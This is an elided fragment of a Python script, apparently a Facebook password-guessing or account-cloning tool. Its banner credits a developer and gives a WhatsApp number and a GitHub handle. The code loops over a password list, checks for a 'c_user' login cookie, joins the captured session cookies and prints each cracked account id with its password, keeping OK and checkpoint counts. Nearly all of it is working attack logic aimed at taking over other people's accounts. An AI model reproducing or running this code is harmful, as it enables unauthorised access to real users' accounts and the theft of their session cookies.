...
\033[1;93m______________________________________________________
 ...
 \033[1;93m(*)\033[1;92m Developer : SABBIR Islam
 \033[1;93m(*)\033[1;92m WhatsApp  : +8801304683013
 \033[1;93m(*)\033[1;92m Version   : 2.0
 \033[1;93m(*)\033[1;92m Github    : SABBIR-XD89 
\033[1;93m______________________________________________________
"""    
loop = 0
oks = []
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('     \033[1;33m[Sabbir-CP] '+cid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r   [%Sabbir/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
main()